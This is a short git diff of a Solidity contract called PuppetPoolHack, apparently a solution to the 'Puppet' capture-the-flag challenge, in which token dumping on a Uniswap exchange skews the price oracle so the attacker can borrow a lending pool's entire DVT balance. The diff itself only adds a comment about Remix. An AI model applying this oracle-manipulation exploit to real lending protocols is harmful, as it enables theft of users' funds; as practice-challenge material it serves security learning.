@@ -46,7 +46,7 @@ contract PuppetPoolHack {
         uniswapExchange.tokenToEthTransferInput(noOfTokens, minEth, block.timestamp, address(this));
         // Get price of the DVT after the swap (hopefully you'd have successfully changed the price)
         uint256 priceAfter = uniswapExchange.getTokenToEthInputPrice(noOfTokens);
-        console.log("Price after: %s", priceAfter);
+        console.log("Price after: %s", priceAfter); // Comment this line out in remix along with the import
         require(msg.value >= 2*priceAfter, "PPH: Not enough ETH provided");
         // Borrow the entire tokens in the pool value, by providing double the equivalent amount of ETH as collateral
         uint256 balance = token.balanceOf(address(lendingPool));
